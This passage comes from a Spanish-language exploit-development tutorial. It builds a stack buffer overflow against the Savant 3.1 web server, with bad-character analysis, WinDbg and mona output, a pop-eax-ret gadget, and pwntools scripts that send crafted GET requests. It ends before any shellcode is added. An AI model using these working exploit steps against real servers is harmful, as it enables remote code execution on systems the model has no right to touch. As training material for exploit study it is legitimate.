badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora al enviar el exploit el programa corrompe y volvemos a tener el control del <code class="language-plaintext highlighter-rouge">eip</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(5c0.d58): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=022b2ca0 ecx=8e527088 edx=00000000 esi=022b2ca0 edi=0041703c  
eip=42424242 esp=043fea1c ebp=4242fffe iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
42424242 ??              ???</span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que el pintero en <code class="language-plaintext highlighter-rouge">esp + 4</code> apunta al inicio de nuestro input, si a ese puntero le aumentamos <code class="language-plaintext highlighter-rouge">0x19</code> llegamos a la ruta donde se encuentra nuestro payload</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db poi(esp + 4)
043fea74  47 45 54 00 00 00 00 00-00 00 00 00 00 00 00 00  GET.............
043fea84  00 00 00 00 00 00 00 00-2f 01 02 03 04 05 06 07  ......../.......
043fea94  08 09 0b 0c 0e 0f 10 11-12 13 14 15 16 17 18 19  ................
043feaa4  1a 1b 1c 1d 1e 1f 20 21-22 23 24 25 26 27 28 29  ...... !"#$%&'()
043feab4  2a 2b 2c 2d 2e 2f 30 31-32 33 34 35 36 37 38 39  *+,-./0123456789
043feac4  3a 3b 3c 3d 3e 3f 40 41-42 43 44 45 46 47 48 49  :;<=>?@ABCDEFGHI
043fead4  4a 4b 4c 4d 4e 4f 50 51-52 53 54 55 56 57 58 59  JKLMNOPQRSTUVWXY
043feae4  5a 5b 5c 5d 5e 5f 60 61-62 63 64 65 66 67 68 69  Z[\]^_`abcdefghi

</span><span class="ro">0:000> </span><span class="p">db poi(esp + 4) + 0x19
043fea8d  01 02 03 04 05 06 07 08-09 0b 0c 0e 0f 10 11 12  ................
043fea9d  13 14 15 16 17 18 19 1a-1b 1c 1d 1e 1f 20 21 22  ............. !"
043feaad  23 24 25 26 27 28 29 2a-2b 2c 2d 2e 2f 30 31 32  #$%&'()*+,-./012
043feabd  33 34 35 36 37 38 39 3a-3b 3c 3d 3e 3f 40 41 42  3456789:;<=>?@AB
043feacd  43 44 45 46 47 48 49 4a-4b 4c 4d 4e 4f 50 51 52  CDEFGHIJKLMNOPQR
043feadd  53 54 55 56 57 58 59 5a-5b 5c 5d 5e 5f 60 61 62  STUVWXYZ[\]^_`ab
043feaed  63 64 65 66 67 68 69 6a-6b 6c 6d 6e 6f 70 71 72  cdefghijklmnopqr
043feafd  73 74 75 76 77 78 79 7a-7b 7c 7d 7e 7f 80 81 82  stuvwxyz{|}~....</span>
</code></pre></div></div><br>

<p class="plain-text">Al comparar los bytes del <code class="language-plaintext highlighter-rouge">.bin</code> con la dirección calculada podemos ver que no se ha modificado por lo que los <code class="language-plaintext highlighter-rouge">3</code> badchars que detectamos son los unicos existentes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">? poi(esp + 4) + 0x19
Evaluate expression: 71297677 = 043fea8d

</span><span class="ro">0:000></span><span class="p"> !py mona compare -f bytearray.bin -a 0x043fea8d
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py compare -f bytearray.bin -a 0x043fea8d  </span><span class="p">
[+] Reading file C:\mona\bytearray.bin...
    Read 253 bytes from file
[+] Preparing output file 'compare.txt'
    - (Re)setting logfile C:\mona\compare.txt
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] C:\mona\bytearray.bin has been recognized as RAW bytes.
[+] Fetched 253 bytes successfully from C:\mona\bytearray.bin
    - Comparing 1 location(s)
Comparing bytes from file with memory :
0x043fea8d | [+] Comparing with memory at location : 0x043fea8d (Stack)
0x043fea8d | !!! Hooray, normal shellcode unmodified !!!
0x043fea8d | Bytes omitted from input: 00 0a 0d</span>
</code></pre></div></div><br>

</section>

<section class="post" id="opcode">
<br><h3 class="post-title">5.4 - Find Opcode</h3><br>

<p class="plain-text">Repasemos, en <code class="language-plaintext highlighter-rouge">esp + 4</code> se encuentra el puntero hacia el inicio de la petición por lo que para retornar a esa dirección tenemos un par de opciones para buscar un gadget</p>
<p class="plain-text">• <code class="language-plaintext highlighter-rouge">pop ???; ret;</code>: Eliminara 4 bytes en el primer pop para guardarlo en el registro y al ejecutar el ret saltará hacia el inicio de la petición.</p>
<p class="plain-text">• <code class="language-plaintext highlighter-rouge">add esp, 4; ret;</code>: Parecido al anterior solo que en lugar de guardar 1 dwords en registros hace que el puntero al stack aumente en 4 bytes para ejecutar el ret.</p><br>

<p class="plain-text">Para encontrar un gadget que ejecute algunas de estas instrucciones primero necesitamos saber que <code class="language-plaintext highlighter-rouge">modulos</code> carga el programa que pertenezcan a el y no al sistema para esto podemos usar mona, solo hay <code class="language-plaintext highlighter-rouge">1</code> modulo pero con un pequeño detalle, inicia con <code class="language-plaintext highlighter-rouge">0x00</code> y esto es un badchar sin embargo como es el <code class="language-plaintext highlighter-rouge">final</code> del payload no nos importa que corte lo que esta delante por lo que podemos usarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona modules -cm os=false
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py modules -cm os=false

---------- Mona command started on 2024-02-28 18:15:48 (v2.0, rev 635) ----------
[+] Processing arguments and criteria
    - Pointer access level : X
    - Module criteria : ['os=false']
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
----------------------------------------------------------------------------------------------------------------------------------------------  
 Module info :
----------------------------------------------------------------------------------------------------------------------------------------------  
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
----------------------------------------------------------------------------------------------------------------------------------------------  
 0x00400000 | 0x00452000 | 0x00052000 | False  | False   | False | False |  False   | False  | 3.1.0.0 [Savant.exe] (Savant.exe) 0x0
----------------------------------------------------------------------------------------------------------------------------------------------  

[+] Preparing output file 'modules.txt'
    - (Re)setting logfile C:\mona\modules.txt</span>
</code></pre></div></div><br>

<p class="plain-text">El gadget que usaremos sera <code class="language-plaintext highlighter-rouge">pop eax</code> para quitar 4 bytes y <code class="language-plaintext highlighter-rouge">ret</code> para retornar al puntero, obtenemos el opcode y buscamos dentro del modulo <code class="language-plaintext highlighter-rouge">Savant.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona asm -s 'pop eax # ret'
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py asm -s 'pop eax # ret'
Opcode results : 
---------------- 
 pop eax = \x58
 ret = \xc3
 Full opcode : \x58\xc3 

</span><span class="ro">0:000> </span><span class="p">!py mona find -s '\x58\xc3' -m savant.exe
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py find -s '\x58\xc3' -m savant.exe

---------- Mona command started on 2024-02-28 18:16:38 (v2.0, rev 635) ----------
[+] Processing arguments and criteria
    - Pointer access level : *
    - Only querying modules savant.exe
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
    - Treating search pattern as bin
[+] Searching from 0x00400000 to 0x00452000
[+] Preparing output file 'find.txt'
    - (Re)setting logfile C:\mona\find.txt
[+] Writing results to C:\mona\find.txt
    - Number of pointers of type ''\x58\xc3'' : 19 
[+] Results : 
0x00418674 |   0x00418674 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041924f |   0x0041924f : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x004194f6 |   0x004194f6 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x00419613 |   0x00419613 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041a531 |   0x0041a531 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041af7f |   0x0041af7f : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041b464 |   0x0041b464 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041b9fa |   0x0041b9fa : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041ba2e |   0x0041ba2e : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041c49a |   0x0041c49a : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041cc30 |   0x0041cc30 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041cce4 |   0x0041cce4 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041eb74 |   0x0041eb74 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041fe21 |   0x0041fe21 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041fe7e |   0x0041fe7e : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x00420904 |   0x00420904 : '\x58\xc3' | startnull,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0  
0x00420a1d |   0x00420a1d : '\x58\xc3' | startnull,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0  
0x00420e69 |   0x00420e69 : '\x58\xc3' | startnull,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0  
0x00420ed8 |   0x00420ed8 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
    Found a total of 19 pointers</span>
</code></pre></div></div><br>

<p class="plain-text">Enviaremos <code class="language-plaintext highlighter-rouge">A's</code> hasta antes de sobrescribir el eip donde estara un <code class="language-plaintext highlighter-rouge">pop eax; ret;</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Establecemos un breakpoint en la dirección del gadget y corremos el exploit anterior</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp 0x00418674

</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=020c2ca0 ecx=0000000e edx=0428e508 esi=020c2ca0 edi=0041703c  
eip=00418674 esp=0428ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18674:
00418674 58              pop     eax</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">pop eax; ret;</code> el programa retorna al inicio de la petición por lo que intentará ejecutar la string del metodo <code class="language-plaintext highlighter-rouge">GET</code> como instrucciones ensamblador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000000 ebx=020c2ca0 ecx=0000000e edx=0428e508 esi=020c2ca0 edi=0041703c  
eip=00418674 esp=0428ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0428fe60 ebx=020c2ca0 ecx=0000000e edx=0428e508 esi=020c2ca0 edi=0041703c  
eip=00418675 esp=0428ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0428fe60 ebx=020c2ca0 ecx=0000000e edx=0428e508 esi=020c2ca0 edi=0041703c  
eip=0428ea74 esp=0428ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
0428ea74 47              inc     edi

</span><span class="ro">0:000> </span><span class="p">db eip
0428ea74  47 45 54 00 00 00 00 00-00 00 00 00 00 00 00 00  GET.............
0428ea84  00 00 00 00 00 00 00 00-2f 41 41 41 41 41 41 41  ......../AAAAAAA
0428ea94  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428eaa4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428eab4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428eac4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428ead4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428eae4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que <code class="language-plaintext highlighter-rouge">0x19</code> bytes mas adelante se encuentra la ruta de la petición que equivale al inicio de nuestras <code class="language-plaintext highlighter-rouge">A's</code> por lo que si ejecutamos los 3 bytes de la string <code class="language-plaintext highlighter-rouge">GET</code> como ensamblador despues ejecutará <code class="language-plaintext highlighter-rouge">null</code> bytes y corromperá el programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db eip + 0x19
0428ea8d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428ea9d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eaad  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eabd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eacd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eadd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eaed  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eafd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  </span>
</code></pre></div></div><br>

<p class="plain-text">Ya que lo que ejecutamos es la string del metodo como instreuccion modificamos el metodo de <code class="language-plaintext highlighter-rouge">GET</code> al opcode de un <code class="language-plaintext highlighter-rouge">jmp</code> corto para saltar los <code class="language-plaintext highlighter-rouge">0x19</code> bytes necesitados</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

method </span><span class="o">= </span><span class="p">asm(</span><span class="s">"jmp $+0x19"</span><span class="p">)

content </span><span class="o">= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo al ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> en lugar de ejecutar un <code class="language-plaintext highlighter-rouge">jmp</code> corto intenta ejecutar <code class="language-plaintext highlighter-rouge">retf</code> esto pasa porque en lugar de escribir <code class="language-plaintext highlighter-rouge">\xeb\x17</code> que equivale a <code class="language-plaintext highlighter-rouge">jmp $+0x19</code> escribió <code class="language-plaintext highlighter-rouge">\xcb\x17</code>, esto es extraño porque no estamos escribiendo ningun badchar pero por alguna razón cambia un <code class="language-plaintext highlighter-rouge">byte</code>, entonces necesitamos buscar alternativas</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=02372ca0 ecx=0000000e edx=0428e508 esi=02372ca0 edi=0041703c  
eip=00418674 esp=0428ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0428fe60 ebx=02372ca0 ecx=0000000e edx=0428e508 esi=02372ca0 edi=0041703c  
eip=00418675 esp=0428ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0428fe60 ebx=02372ca0 ecx=0000000e edx=0428e508 esi=02372ca0 edi=0041703c  
eip=0428ea74 esp=0428ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
0428ea74 cb              retf

</span><span class="ro">0:000> </span><span class="p">dd eip L1
0428ea74  000017cb</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos intentar en lugar de un simple <code class="language-plaintext highlighter-rouge">jmp</code> usar un jmp condicional para cambiar el opcode, para ello usaremos <code class="language-plaintext highlighter-rouge">je</code> tambien llamado <code class="language-plaintext highlighter-rouge">jz</code> que salta si la flag <code class="language-plaintext highlighter-rouge">zf</code> se activa, para activarlo usaremos <code class="language-plaintext highlighter-rouge">xor eax, eax</code> que da como resultado <code class="language-plaintext highlighter-rouge">0</code> y lo activa, pero como este opcode pesa <code class="language-plaintext highlighter-rouge">2</code> bytes bajaremos el salto de <code class="language-plaintext highlighter-rouge">0x19</code> a solo <code class="language-plaintext highlighter-rouge">0x17</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">method </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"je $+0x17"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Pero ¡oh sorpresa!, intenta ejecutar la instrucción <code class="language-plaintext highlighter-rouge">push esp</code>, ¿porque?, similar a lo anterior el programa cambio los bytes del opcode <code class="language-plaintext highlighter-rouge">\x74\x15</code> a los bytes <code class="language-plaintext highlighter-rouge">\x54\x15</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=006e2ca0 ecx=0000000e edx=0430e508 esi=006e2ca0 edi=0041703c  
eip=00418674 esp=0430ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0430fe60 ebx=006e2ca0 ecx=0000000e edx=0430e508 esi=006e2ca0 edi=0041703c  
eip=00418675 esp=0430ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0430fe60 ebx=006e2ca0 ecx=0000000e edx=0430e508 esi=006e2ca0 edi=0041703c  
eip=0430ea74 esp=0430ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
0430ea74 31c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=006e2ca0 ecx=0000000e edx=0430e508 esi=006e2ca0 edi=0041703c  
eip=0430ea76 esp=0430ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
0430ea76 54              push    esp

</span><span class="ro">0:000> </span><span class="p">dd eip L1
0430ea76  00001554</span>
</code></pre></div></div><br>

<p class="plain-text">Después de probar multiples <a href="https://faydoc.tripod.com/cpu/jle.htm">jmps condicionales</a> encontramos uno que funciona y es <code class="language-plaintext highlighter-rouge">jle</code>, que salta si la flag <code class="language-plaintext highlighter-rouge">zf</code> esta activada o si la flag <code class="language-plaintext highlighter-rouge">sf</code> no es igual a la flag <code class="language-plaintext highlighter-rouge">of</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">method </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Controlamos la condicion activando la flag <code class="language-plaintext highlighter-rouge">zf</code> con el <code class="language-plaintext highlighter-rouge">xor eax, eax</code>, esta vez los bytes no cambian y la instrucción es un <code class="language-plaintext highlighter-rouge">jle</code> a <code class="language-plaintext highlighter-rouge">0x0427ea8d</code> y la condicion se cumple</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c
eip=00418674 esp=0427ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0427fe60 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c
eip=00418675 esp=0427ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0427fe60 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c
eip=0427ea74 esp=0427ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
0427ea74 31c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c
eip=0427ea76 esp=0427ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0427ea76 7e15            jle     0427ea8d                                [br=1]  </span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">jle</code> saltamos los <code class="language-plaintext highlighter-rouge">0x17</code> bytes al inicio de las <code class="language-plaintext highlighter-rouge">A's</code> sin embargo aunque ejecutamos esas A's como instrucciones y tenemos más espacio solo podemos escribir <code class="language-plaintext highlighter-rouge">253</code> bytes que aun no es suficiente para un <code class="language-plaintext highlighter-rouge">shellcode</code> de msfvenom</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c  
eip=0427ea8d esp=0427ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
0427ea8d 41              inc     ecx

</span><span class="ro">0:000> </span><span class="p">db eip L100
0427ea8d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
